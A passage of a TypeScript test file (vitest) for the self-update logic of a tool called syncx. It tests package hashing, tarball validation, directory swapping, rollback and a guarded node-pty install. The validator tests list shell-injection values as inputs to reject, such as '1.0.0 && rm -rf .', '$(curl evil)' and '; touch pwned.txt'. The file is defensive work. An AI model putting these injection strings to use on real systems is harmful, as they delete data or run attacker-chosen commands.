import { describe, expect, it } from 'vitest';
import { createHash, randomBytes } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { spawn, spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { basename, delimiter, dirname, join } from 'node:path';
import {
  consumeUpdateDoneFile,
  extractAndValidate,
  inspectPackage,
  isSafePtyRange,
  packSelfTgz,
  runSelfUpdate,
  sha256Hex,
} from '../src/selfupdate.js';

/** 等待文件出现(updater 结果文件),超时抛错。 */
async function waitForFile(path: string, timeoutMs = 20_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (existsSync(path)) return;
    await new Promise((r) => setTimeout(r, 200));
  }
  throw new Error(`等待超时: ${path}`);
}

/** 造一个可实跑的假安装目录:package.json + dist/syncx.js(-v 读旁边 package.json,与真 bundle 同口径)。 */
function makeFakePackage(parent: string, name: string, version: string): string {
  const root = join(parent, name);
  mkdirSync(join(root, 'dist'), { recursive: true });
  writeFileSync(
    join(root, 'package.json'),
    JSON.stringify({ name: '@wangmingfa/syncx', version }),
  );
  writeFileSync(
    join(root, 'dist', 'syncx.js'),
    [
      '#!/usr/bin/env node',
      "import { readFileSync } from 'node:fs';",
      "process.stdout.write(String(JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')).version));",
      '',
    ].join('\n'),
  );
  return root;
}

/** 用系统 tar 把目录打成 tgz(与生产 P2P 发送侧同一条路径;相对归档名避 GNU tar 的 C: 陷阱)。 */
function tgzDir(dir: string): Buffer {
  const work = mkdtempSync(join(tmpdir(), 'syncx-test-tgz-'));
  const r = spawnSync('tar', ['-czf', 'out.tgz', '-C', dir, '.'], { encoding: 'utf8', cwd: work });
  if (r.status !== 0) throw new Error(`tar 打包失败: ${r.stderr}`);
  const buf = readFileSync(join(work, 'out.tgz'));
  rmSync(work, { recursive: true, force: true });
  return buf;
}

describe('sha256Hex', () => {
  it('produces a stable hex digest', () => {
    const data = Buffer.from('syncx package content');
    const a = sha256Hex(data);
    const b = sha256Hex(Buffer.from('syncx package content'));

    expect(a).toMatch(/^[0-9a-f]{64}$/);
    expect(a).toBe(b);
  });

  it('differs for different content (even 1 byte)', () => {
    const a = sha256Hex(Buffer.alloc(64 * 1024, 0x41));
    const b = sha256Hex(Buffer.alloc(64 * 1024, 0x42));

    expect(a).not.toBe(b);
  });

  it('matches an independently computed sha256', () => {
    const data = Buffer.alloc(48 * 1024, 0x20);
    const expected = createHash('sha256').update(data).digest('hex');

    expect(sha256Hex(data)).toBe(expected);
  });
});

describe('packSelfTgz', () => {
  it('returns undefined in dev runtime', async () => {
    // vitest / tsx 下 import.meta.url 指向 .ts → dev 态,没有可打包的安装目录
    await expect(packSelfTgz()).resolves.toBeUndefined();
  });

  /**
   * node_modules 绝不能进整包。updater 换包成功后会在**安装目录里**现装 node-pty
   * (原生模块,单文件 bundle 带不走),于是安装目录旁就多了几十 MB。接收方不依赖那个目录
   * (bundle 自包含,只缺 node-pty,而它会由对端自己的 updater 现装),而带着它打包会顶穿
   * MIN/MAX_PACKAGE_BYTES 或 30 秒 tar 超时 → packSelfTgz 静默返回 undefined →
   * 「发给对端升级」变成「不可用」。
   */
  it('excludes node_modules from the packed payload', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-pack-'));
    const pkgDir = makeFakePackage(work, 'pkg', '0.2.0');
    // 撑过 MIN_PACKAGE_BYTES(16KB),否则 packSelfTgz 走到体积闸门就返回 undefined。
    // 必须用随机字节:'a'.repeat(40K) 压完只剩几十字节,过不了这道闸。
    writeFileSync(join(pkgDir, 'dist', 'blob.bin'), randomBytes(40 * 1024));
    mkdirSync(join(pkgDir, 'node_modules', 'node-pty', 'build'), { recursive: true });
    writeFileSync(
      join(pkgDir, 'node_modules', 'node-pty', 'package.json'),
      JSON.stringify({ name: 'node-pty', version: '1.1.0' }),
    );
    writeFileSync(join(pkgDir, 'node_modules', 'node-pty', 'build', 'pty.node'), randomBytes(64 * 1024));

    const tgz = await packSelfTgz(pkgDir);
    expect(tgz).toBeInstanceOf(Buffer);

    const tgzPath = join(work, 'packed.tgz');
    writeFileSync(tgzPath, tgz as unknown as Buffer);
    const listed = spawnSync('tar', ['-tzf', tgzPath], { encoding: 'utf8' });
    expect(listed.status).toBe(0);
    expect(listed.stdout).not.toContain('node_modules');
    // 排除不能把正包一起排除掉
    expect(listed.stdout).toContain('dist/syncx.js');
    expect(listed.stdout).toContain('package.json');
    rmSync(work, { recursive: true, force: true });
  });
});

describe('isSafePtyRange', () => {
  it('accepts the ranges npm actually uses', () => {
    for (const range of ['^1.1.0', '~1.1.0', '1.1.0', '>=1.0.0 <2.0.0', '^1.0.0 || ^2.0.0', '*', '^1.2.0-beta.15']) {
      expect(isSafePtyRange(range), range).toBe(true);
    }
  });

  /**
   * 仓库自己声明的那条范围是 updater 现装 node-pty 的唯一输入,它坏有两种安静方式:
   * - 过不了白名单 → npm 根本不被调用,终端落受限模式(有日志,但得翻到升级结果才看得见);
   * - 过得去但**那个版本没有本机平台的预编译件** → Linux 上 npm 会转 node-gyp,而 npm 11 默认
   *   拦住 install 脚本,连编译都不发生,落地即无 `.node`(实测于 aarch64:`1.1.0` 走这条路必挂)。
   * 下面那条下限只是**下限**:它挡得住「顺手降回 1.1.x」,挡不住「升到某个又不带 linux 预编译的版本」,
   * 后者只能在目标机上量 —— 改这条范围时请按 README 的升级链路实机验一次。
   */
  it("keeps this repo's own declaration installable", () => {
    const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')) as {
      dependencies?: Record<string, string>;
    };
    const range = pkg.dependencies?.['node-pty'];
    expect(typeof range).toBe('string');
    expect(isSafePtyRange(range), String(range)).toBe(true);
    // 带 prebuilds/linux-x64 + linux-arm64 的那一档起(1.2.0-beta.15 实测落地四平台预编译)
    expect(range, String(range)).toMatch(/^(?:[\^~]?)1\.(?:[2-9]|[1-9]\d)\./);
  });

  /**
   * 这条范围来自**新包的 package.json**,P2P 路径上就是「对端写的字符串」,
   * 而 Windows 侧的 npm.cmd 还要经 shell 拼接。判据宁可窄:误杀只是终端落受限模式,
   * 放进 shell 就是别人的机器在跑别人写的命令行。
   */
  it('rejects anything that could reach a shell', () => {
    for (const range of [
      '1.0.0; touch /tmp/pwned',
      '1.0.0 && rm -rf .',
      '^1.0.0 || $(curl evil)',
      '1.0.0 `id`',
      '1.0.0%PATH%',
      'file:../../evil',
      'C:\\windows\\system32',
      'npm:other@1',
      'x'.repeat(200),
      123,
      undefined,
      null,
      { x: 1 },
    ]) {
      expect(isSafePtyRange(range), String(range)).toBe(false);
    }
  });
});

describe('extractAndValidate', () => {
  it('extracts and validates a well-formed package', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-pkg-'));
    const pkgDir = makeFakePackage(work, 'pkg', '0.2.0');
    const tgz = tgzDir(pkgDir);

    const staging = await extractAndValidate(tgz, '0.2.0', { minBytes: 16 });

    expect(readFileSync(join(staging.root, 'package.json'), 'utf8')).toContain('0.2.0');
    expect(existsSync(join(staging.root, 'dist', 'syncx.js'))).toBe(true);
    expect(existsSync(join(staging.workDir, 'pkg.tgz'))).toBe(true);
    rmSync(work, { recursive: true, force: true });
  });

  it('rejects version mismatch between package.json and declared version', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-pkg-'));
    const pkgDir = makeFakePackage(work, 'pkg', '9.9.9');
    const tgz = tgzDir(pkgDir);

    await expect(extractAndValidate(tgz, '0.2.0', { minBytes: 16 })).rejects.toThrow('与宣告');
    rmSync(work, { recursive: true, force: true });
  });

  it('rejects corrupt tarballs', async () => {
    const garbage = Buffer.concat([Buffer.from('not a tarball at all'), Buffer.alloc(64 * 1024, 0x20)]);

    await expect(extractAndValidate(garbage, '0.2.0', { minBytes: 16 })).rejects.toThrow('tar 解压');
  });

  it('rejects undersized payloads before touching tar', async () => {
    await expect(extractAndValidate(Buffer.from('x'), '0.2.0')).rejects.toThrow('疑似损坏');
  });
});

describe('runSelfUpdate', () => {
  it('swaps the target directory and reports success via done file', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-swap-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    // 「旧安装」:0.1.0
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    // 新包 tgz:0.2.0
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const tgz = tgzDir(stagingSrc);
    // 一个必死的进程作为「旧进程」:updater 的 alive() 立即返回 false
    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
      targetDir,
      minBytes: 16,
      oldPid: deadPid,
      waitMs: 10_000,
      verifyMs: 400,
      // 「新 daemon」:活 1.2 秒,超过 400ms 观察期即视为启动成功
      restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
    });

    await waitForFile(doneFile);
    const result = JSON.parse(readFileSync(doneFile, 'utf8')) as { ok?: boolean; version?: string };
    expect(result.ok).toBe(true);
    expect(result.version).toBe('0.2.0');
    // 目标目录已被换入新包
    expect(readFileSync(join(targetDir, 'package.json'), 'utf8')).toContain('0.2.0');
    // 旧包备份已清理
    expect(existsSync(join(install, '.syncx-update-backup'))).toBe(false);
    rmSync(work, { recursive: true, force: true });
  }, 30_000);

  /**
   * 生成的 updater 脚本本身也要能被审 —— 它是唯一跑在「旧进程已死、包已换入」之后的代码,
   * 而 macOS/Linux 上永远执行不到 Windows 那一支。这里用静态断言把两条分支的形状钉死:
   * 早先的实现把整条命令拼成一个字符串、只在 Windows 开 shell,于是 POSIX 下
   * Node 拿整个字符串去 execvp → ENOENT,node-pty 在 Mac/Linux 上一次都没装上过,
   * 而这个形状在本机上任何测试都看不出来。
   */
  it('generates an updater script whose npm call is split by platform', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-gen-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const tgz = tgzDir(stagingSrc);
    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
      targetDir: join(install, 'syncx'),
      minBytes: 16,
      oldPid: deadPid,
      waitMs: 10_000,
      verifyMs: 400,
      restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
    });
    await waitForFile(doneFile);

    const updaterFile = join(dirname(doneFile), 'updater.mjs');
    const code = readFileSync(updaterFile, 'utf8');
    // 生成的脚本必须真的可解析(它是独立 ES 模块,拼错一个引号就等于升级整条路径报废)
    const check = spawnSync(process.execPath, ['--check', updaterFile], { encoding: 'utf8' });
    expect(check.status, check.stderr).toBe(0);

    expect(code).toContain("spawnSync('npm', args, opts)"); // POSIX:argv
    // Windows:npm.cmd 须经 shell,但整条命令是常量 —— 外部数据(对端包里的版本范围)
    // 一个字都不进命令行,它只作为 npm 读 own 的 package.json 里的依赖声明存在。
    expect(code).toContain("spawnSync('npm.cmd install --omit=dev --no-audit --no-fund', { ...opts, shell: true })");
    expect(code).toContain("dependencies: { 'node-pty': range }");
    expect(code).not.toContain('shell: isWin'); // 老 bug 的形状:单串命令 + 只有 Windows 开 shell
    expect(code).not.toContain('+ spec +'); // 更老的形状:把范围拼回命令串
    rmSync(work, { recursive: true, force: true });
  }, 60_000);

  /**
   * node-pty 安装步骤(封闭验证:PATH 上放一个假 npm,不碰网络)。
   *
   * 假 npm 把「被调用时的 cwd 与命令行」写到一个测试已知位置的标记文件里,于是这里能
   * 同时钉住三件事:
   * - updater 确实调了 npm,且产物被拷进了 targetDir/dist 的解析路径上;
   * - npm 的 cwd 是 workDir 下一个一次性的 pty-install,**不是** targetDir —— 在安装目录里
   *   跑 npm install 会按它的 package.json 把**整棵依赖树**补齐(实测 273MB,而 vue/naive-ui/
   *   @xterm 早就内联进单文件 bundle 了,纯属死重);
   * - 命令行里没有版本范围:对端包声明的字符串只作为 npm 自己读的 package.json 依赖存在,
   *   Windows 那侧经 shell 拼接的命令里不再携带任何外部数据。
   */
  it('updater installs node-pty into the target when the package declares it', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-pty-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    // 新包声明 node-pty 依赖 → 触发 updater 的安装步骤
    const pkgPath = join(stagingSrc, 'package.json');
    const pkg = JSON.parse(readFileSync(pkgPath, 'utf8')) as { dependencies?: Record<string, string> };
    pkg.dependencies = { 'node-pty': '^1.1.0' };
    writeFileSync(pkgPath, JSON.stringify(pkg));
    const tgz = tgzDir(stagingSrc);

    const fakeBin = join(work, 'fakebin');
    mkdirSync(fakeBin, { recursive: true });
    const marker = join(fakeBin, 'npm-invoked.txt');
    writeFileSync(
      join(fakeBin, 'npm'),
      '#!/bin/sh\n' +
        `printf 'cwd=%s\\nargs=%s\\n' "$(pwd)" "$*" > ${marker}\n` +
        'mkdir -p node_modules/node-pty\n' +
        'printf \'{"name":"node-pty","version":"9.9.9-fake"}\' > node_modules/node-pty/package.json\nexit 0\n',
      { mode: 0o755 },
    );
    writeFileSync(join(fakeBin, 'npm.cmd'), [
      '@echo off',
      `echo cwd=%CD% > ${marker}`,
      `echo args=%* >> ${marker}`,
      'if not exist node_modules\\node-pty mkdir node_modules\\node-pty',
      'echo {"name":"node-pty","version":"9.9.9-fake"} > node_modules\\node-pty\\package.json',
      'exit /b 0',
    ].join('\r\n'));
    const prevPath = process.env.PATH ?? '';
    process.env.PATH = `${fakeBin}${delimiter}${prevPath}`;

    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    try {
      const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
        targetDir,
        minBytes: 16,
        oldPid: deadPid,
        waitMs: 10_000,
        verifyMs: 400,
        restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
      });

      await waitForFile(doneFile);
      const result = JSON.parse(readFileSync(doneFile, 'utf8')) as {
        ok?: boolean;
        pty?: { attempted?: boolean; ok?: boolean; error?: string };
      };
      expect(result.ok).toBe(true);
      expect(result.pty).toEqual({ attempted: true, ok: true, error: '' });
      // 装好的原生模块被拷到 targetDir 旁:dist/syncx.js 的 import('node-pty') 沿父目录上溯命中
      expect(existsSync(join(targetDir, 'node_modules', 'node-pty', 'package.json'))).toBe(true);

      const invoked = readFileSync(marker, 'utf8');
      const cwd = /^cwd=(.*)$/m.exec(invoked)?.[1]?.trim();
      const args = /^args=(.*)$/m.exec(invoked)?.[1]?.trim();
      expect(cwd).toBeTruthy();
      // npm 跑在一次性的安装目录里,不是安装目录本身
      expect(basename(cwd as string)).toBe('pty-install');
      expect(cwd).not.toBe(targetDir);
      // 范围没有上命令行
      expect(args ?? '').not.toContain('1.1.0');
      // 现场清掉了(updater 的 finally)
      expect(existsSync(join(dirname(doneFile), 'pty-install'))).toBe(false);
    } finally {
      process.env.PATH = prevPath;
      rmSync(work, { recursive: true, force: true });
    }
  }, 60_000);

  /**
   * spawn-helper 的执行位(受限模式第二轮的真正根因)。
   *
   * node-pty 在 unix 上要 exec 一个 spawn-helper,而它自己的脚本链没人管这个位:
   * install 脚本(scripts/prebuild.js)只看 prebuilds 目录存不存在就 exit 0,post-install
   * 只清 build/Release。npm 提取出来是 0644 —— 实测同一份 1.1.0 在仓库里 0755、在升级
   * 安装目录里 0644,后果是 pty.spawn 抛 posix_spawnp failed。这里让假 npm 装出 0644 的
   * helper,断言 updater 换包后把它补成可执行。.node 不需要执行位,故只补这一个文件。
   */
  it('re-puts the exec bit on node-pty spawn-helper after installing', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-helper-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const pkgPath = join(stagingSrc, 'package.json');
    const pkg = JSON.parse(readFileSync(pkgPath, 'utf8')) as { dependencies?: Record<string, string> };
    pkg.dependencies = { 'node-pty': '^1.1.0' };
    writeFileSync(pkgPath, JSON.stringify(pkg));
    const tgz = tgzDir(stagingSrc);

    const helperRel = join('node_modules', 'node-pty', 'prebuilds', `${process.platform}-${process.arch}`, 'spawn-helper');
    const fakeBin = join(work, 'fakebin');
    mkdirSync(fakeBin, { recursive: true });
    // 假 npm 在它的 cwd(=一次性安装目录)里装出一个 0644 的 helper,路径与 ensurePtyHelper 一致
    writeFileSync(
      join(fakeBin, 'npm'),
      '#!/bin/sh\n' +
        `mkdir -p $(dirname ${helperRel})\n` +
        `printf '#!/bin/sh\\n' > ${helperRel}\n` +
        `chmod 644 ${helperRel}\nexit 0\n`,
      { mode: 0o755 },
    );
    // Windows 的执行位没有对应语义,假 npm.cmd 只把 node_modules 造出来让拷贝有东西可做
    writeFileSync(join(fakeBin, 'npm.cmd'), ['@echo off', 'exit /b 0'].join('\r\n'));
    const prevPath = process.env.PATH ?? '';
    process.env.PATH = `${fakeBin}${delimiter}${prevPath}`;

    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    try {
      const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
        targetDir,
        minBytes: 16,
        oldPid: deadPid,
        waitMs: 10_000,
        verifyMs: 400,
        restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
      });
      await waitForFile(doneFile);
      const result = JSON.parse(readFileSync(doneFile, 'utf8')) as { pty?: { ok?: boolean; error?: string } };
      expect(result.pty?.ok).toBe(true);

      if (process.platform !== 'win32') {
        const helper = join(targetDir, helperRel);
        expect(existsSync(helper)).toBe(true);
        expect(statSync(helper).mode & 0o111).not.toBe(0);
      }
    } finally {
      process.env.PATH = prevPath;
      rmSync(work, { recursive: true, force: true });
    }
  }, 60_000);

  /**
   * 新 daemon 的 stdout/stderr 必须落到 --log-file,而不是 /dev/null。
   *
   * 第一版拉新进程用 stdio:'ignore',于是启动期任何 console.error(含 main.ts 的
   * uncaughtException / unhandledRejection 兜底)都进黑洞:那次「posix_spawnp failed」把
   * 终端卡在连接中、日志里一个字都没有,排查只能靠猜。这里让假 daemon 往 stderr 写一行,
   * 断言它真的出现在日志文件里。argv 形状与生产一致(脚本路径在前),否则 node 会把
   * --log-file 当成自己的选项直接报错 —— 那等于测的是另一条路径。
   */
  it('routes the restarted daemon stderr into --log-file', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-log-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const tgz = tgzDir(stagingSrc);
    const logFile = join(work, 'syncx.log');
    const daemonScript = join(work, 'fake-daemon.mjs');
    writeFileSync(daemonScript, "console.error('[fatal] simulated boot failure');\nsetTimeout(() => {}, 1500);\n");

    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
      targetDir: join(install, 'syncx'),
      minBytes: 16,
      oldPid: deadPid,
      waitMs: 10_000,
      verifyMs: 400,
      restartArgs: [daemonScript, '--log-file', logFile],
    });

    await waitForFile(doneFile);
    await waitForFile(logFile);
    expect(readFileSync(logFile, 'utf8')).toContain('simulated boot failure');
    rmSync(work, { recursive: true, force: true });
  }, 60_000);

  it('pty install failure must not roll back the upgrade (终端只是降级,升级不算失败)', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-ptyfail-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const pkgPath = join(stagingSrc, 'package.json');
    const pkg = JSON.parse(readFileSync(pkgPath, 'utf8')) as { dependencies?: Record<string, string> };
    pkg.dependencies = { 'node-pty': '^1.1.0' };
    writeFileSync(pkgPath, JSON.stringify(pkg));
    const tgz = tgzDir(stagingSrc);

    const fakeBin = join(work, 'fakebin');
    mkdirSync(fakeBin, { recursive: true });
    // 必败的假 npm
    writeFileSync(join(fakeBin, 'npm'), '#!/bin/sh\nexit 3\n', { mode: 0o755 });
    writeFileSync(join(fakeBin, 'npm.cmd'), ['@echo off', 'exit /b 3'].join('\r\n'));
    const prevPath = process.env.PATH ?? '';
    process.env.PATH = `${fakeBin}${delimiter}${prevPath}`;

    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    try {
      const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
        targetDir,
        minBytes: 16,
        oldPid: deadPid,
        waitMs: 10_000,
        verifyMs: 400,
        restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
      });

      await waitForFile(doneFile);
      const result = JSON.parse(readFileSync(doneFile, 'utf8')) as {
        ok?: boolean;
        rolledBack?: boolean;
        pty?: { attempted?: boolean; ok?: boolean; error?: string };
      };
      // 升级本体算成功;pty 失败只如实记录
      expect(result.ok).toBe(true);
      expect(result.rolledBack).toBeUndefined();
      expect(result.pty?.attempted).toBe(true);
      expect(result.pty?.ok).toBe(false);
      // 必须钉住「失败原因」而不只是 ok=false:早先版本只断言 ok=false,于是 npm
      // 压根没被拉起来(POSIX 下 spawnSync 拿到整条命令串 → ENOENT)时用例照样绿,
      // 这个阻塞级 bug 就这么跟着提交上了主干。
      expect(result.pty?.error).toContain('退出码 3');
    } finally {
      process.env.PATH = prevPath;
      rmSync(work, { recursive: true, force: true });
    }
  }, 60_000);

  /**
   * 对端来的包里塞一条不该交给 npm 的 node-pty 范围:升级照做,npm 照旧不执行。
   *
   * 判据是 done 文件里的原因文案 + 两个「不该出现的文件」:假 npm 留下的调用标记,
   * 以及被注入内容真跑起来才会落地的 pwned.txt。少断一半都行,但整条路径只在
   * 「npm 从未被拉起」时同时成立 —— 这正是白名单要保住的东西。
   * 标记必须写在测试知道的绝对路径上:假 npm 的 cwd 现在是那个用完即删的一次性目录,
   * 相对路径下的标记「没被调用」和「调用完又被删」长得一模一样,断言就废了。
   */
  it('refuses to hand a peer-authored node-pty range to npm, and still upgrades', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-ptyevil-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const pkgPath = join(stagingSrc, 'package.json');
    const pkg = JSON.parse(readFileSync(pkgPath, 'utf8')) as { dependencies?: Record<string, string> };
    pkg.dependencies = { 'node-pty': '1.0.0; touch pwned.txt' };
    writeFileSync(pkgPath, JSON.stringify(pkg));
    const tgz = tgzDir(stagingSrc);

    const ranMarker = join(work, 'npm-ran.txt');
    const fakeBin = join(work, 'fakebin');
    mkdirSync(fakeBin, { recursive: true });
    writeFileSync(join(fakeBin, 'npm'), `#!/bin/sh\ntouch ${ranMarker}\ntouch pwned.txt\nexit 0\n`, { mode: 0o755 });
    writeFileSync(
      join(fakeBin, 'npm.cmd'),
      ['@echo off', `type nul > ${ranMarker}`, 'type nul > pwned.txt', 'exit /b 0'].join('\r\n'),
    );
    const prevPath = process.env.PATH ?? '';
    process.env.PATH = `${fakeBin}${delimiter}${prevPath}`;

    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    try {
      const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
        targetDir,
        minBytes: 16,
        oldPid: deadPid,
        waitMs: 10_000,
        verifyMs: 400,
        restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
      });

      await waitForFile(doneFile);
      const result = JSON.parse(readFileSync(doneFile, 'utf8')) as {
        ok?: boolean;
        pty?: { attempted?: boolean; ok?: boolean; error?: string };
      };
      expect(result.ok).toBe(true);
      expect(result.pty?.attempted).toBe(false);
      expect(result.pty?.ok).toBe(false);
      expect(result.pty?.error).toContain('已跳过安装');
      expect(existsSync(ranMarker)).toBe(false);
      expect(existsSync(join(targetDir, 'pwned.txt'))).toBe(false);
    } finally {
      process.env.PATH = prevPath;
      rmSync(work, { recursive: true, force: true });
    }
  }, 60_000);

  it('rolls back to the old package when the new daemon dies immediately', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-rb-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.2.0');
    const tgz = tgzDir(stagingSrc);
    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    const { doneFile } = await runSelfUpdate(tgz, '0.2.0', {
      targetDir,
      minBytes: 16,
      oldPid: deadPid,
      waitMs: 10_000,
      verifyMs: 400,
      // 「新 daemon」:立即退出 → updater 应回滚旧包
      restartArgs: ['-e', 'process.exit(7)'],
    });

    await waitForFile(doneFile);
    const result = JSON.parse(readFileSync(doneFile, 'utf8')) as { ok?: boolean; rolledBack?: boolean };
    expect(result.ok).toBe(false);
    expect(result.rolledBack).toBe(true);
    // 旧包被还原
    expect(readFileSync(join(targetDir, 'package.json'), 'utf8')).toContain('0.1.0');
    expect(existsSync(join(targetDir, 'dist', 'syncx.js'))).toBe(true);
    rmSync(work, { recursive: true, force: true });
  }, 30_000);
});

describe('上传来源:包内自带版本(无宣告)', () => {
  it('extractAndValidate 传 undefined 时采用包内版本', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-nover-'));
    const pkgDir = makeFakePackage(work, 'pkg', '1.4.0');
    const tgz = tgzDir(pkgDir);

    const staged = await extractAndValidate(tgz, undefined, { minBytes: 16, verify: false });

    expect(staged.version).toBe('1.4.0');
    rmSync(staged.workDir, { recursive: true, force: true });
    rmSync(work, { recursive: true, force: true });
  });

  it('inspectPackage 读出包内版本与包名,并清理临时目录', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-inspect-'));
    const pkgDir = makeFakePackage(work, 'pkg', '0.3.1');
    const tgz = tgzDir(pkgDir);

    const info = await inspectPackage(tgz, { minBytes: 16, verify: false });

    expect(info.version).toBe('0.3.1');
    expect(info.name).toBe('@wangmingfa/syncx');
    rmSync(work, { recursive: true, force: true });
  });

  it('inspectPackage 拒绝版本号非法的包', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-inspect-bad-'));
    const root = join(work, 'pkg');
    mkdirSync(join(root, 'dist'), { recursive: true });
    writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'syncx', version: 'not-a-version' }));
    writeFileSync(join(root, 'dist', 'syncx.js'), '#!/usr/bin/env node\nprocess.exit(0);\n');
    const tgz = tgzDir(root);

    await expect(inspectPackage(tgz, { minBytes: 16, verify: false })).rejects.toThrow('版本号异常');
    rmSync(work, { recursive: true, force: true });
  });

  it('上传包整包替换后按包内版本落地', async () => {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-upload-'));
    const install = join(work, 'install');
    mkdirSync(install, { recursive: true });
    makeFakePackage(install, 'syncx', '0.1.0');
    const targetDir = join(install, 'syncx');
    const stagingSrc = makeFakePackage(work, 'newpkg', '0.5.0');
    const tgz = tgzDir(stagingSrc);
    const dead = spawn(process.execPath, ['-e', 'process.exit(0)']);
    const deadPid = dead.pid as number;
    await new Promise<void>((resolve) => dead.on('exit', resolve));

    const { doneFile, version } = await runSelfUpdate(tgz, undefined, {
      targetDir,
      minBytes: 16,
      verify: false,
      oldPid: deadPid,
      waitMs: 10_000,
      verifyMs: 400,
      restartArgs: ['-e', 'setTimeout(() => {}, 1200)'],
    });

    expect(version).toBe('0.5.0');
    await waitForFile(doneFile);
    const result = JSON.parse(readFileSync(doneFile, 'utf8')) as { ok?: boolean; version?: string };
    expect(result.ok).toBe(true);
    expect(result.version).toBe('0.5.0');
    expect(readFileSync(join(targetDir, 'package.json'), 'utf8')).toContain('0.5.0');
    rmSync(work, { recursive: true, force: true });
  }, 30_000);
});

describe('consumeUpdateDoneFile', () => {
  /** 造结果文件并消费它,返回记下的日志。 */
  function report(result: unknown): { info: string[]; warn: string[] } {
    const work = mkdtempSync(join(tmpdir(), 'syncx-test-done-'));
    const p = join(work, 'update-done.json');
    const logs = { info: [] as string[], warn: [] as string[] };
    const logger = {
      info: (m: string) => logs.info.push(m),
      warn: (m: string) => logs.warn.push(m),
    };
    try {
      writeFileSync(p, JSON.stringify(result));
      consumeUpdateDoneFile(logger, p);
      // 用后即删:新 daemon 不该在下次启动时重放这次的结果
      expect(existsSync(p)).toBe(false);
    } finally {
      rmSync(work, { recursive: true, force: true });
    }
    return logs;
  }

  it('reports a successful pty install as full mode', () => {
    const logs = report({ ok: true, version: '0.2.0', pty: { attempted: true, ok: true, error: '' } });

    expect(logs.warn).toEqual([]);
